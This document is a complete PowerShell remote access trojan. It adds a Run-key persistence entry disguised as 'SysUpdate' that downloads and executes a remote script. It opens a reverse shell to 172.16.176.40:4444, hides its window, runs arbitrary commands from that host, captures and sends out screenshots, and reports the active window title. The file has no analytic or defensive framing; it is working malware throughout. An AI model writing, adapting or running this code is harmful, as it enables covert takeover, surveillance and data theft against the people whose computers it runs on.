# Persistence
$user = "B15cu1t"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (-not (Get-ItemProperty $regPath -Name "SysUpdate" -ErrorAction SilentlyContinue)) {
    Set-ItemProperty $regPath "SysUpdate" "powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v3.ps1'))"
}

try {
    $a = "System.Net.Sockets."
    $b = "TCPClient"
    $c = New-Object ($a + $b)("172.16.176.40", 4444)
    $s = $c.GetStream()
} catch {
    Start-Sleep 5
    exit
}

[byte[]]$b_arr = 0..65535|%{0}
$m = ([text.encoding]::ASCII).GetBytes("CONNECTED`n$ ")
$s.Write($m,0,$m.Length)

# Hide window
try {
    Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);' -Name W32 -Namespace W -PassThru
    [W32]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
} catch {}

# Screenshot
function Get-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
    $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
    $mem = New-Object System.IO.MemoryStream
    $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $base64 = [Convert]::ToBase64String($mem.ToArray())
    $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
    return $base64
}

# Window
Add-Type @"
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
"@ -Name Win32

function Get-ActiveWin {
    $handle = [Win32]::GetForegroundWindow()
    $builder = New-Object System.Text.StringBuilder 256
    [Win32]::GetWindowText($handle, $builder, 256)
    return $builder.ToString()
}

while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i).Trim()
    
    if ($d -eq "screenshot") {
        $sb = Get-Screenshot
    }
    elseif ($d -eq "window") {
        $sb = "[ACTIVE]: " + (Get-ActiveWin)
    }
    elseif ($d -eq "kill") {
        Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SysUpdate" -ErrorAction SilentlyContinue
        $sb = "[!] Killed."
        Start-Sleep 1; $c.Close(); exit
    }
    else {
        try { 
            $sb = (Invoke-Expression $d 2>&1 | Out-String) 
        } catch { 
            $sb = $_.Exception.Message 
        }
    }
    
    $out = $sb + "$ " + (pwd).Path + "> "
    $m = ([text.encoding]::ASCII).GetBytes($out)
    $s.Write($m,0,$m.Length)
    $s.Flush()
}
$c.Close()
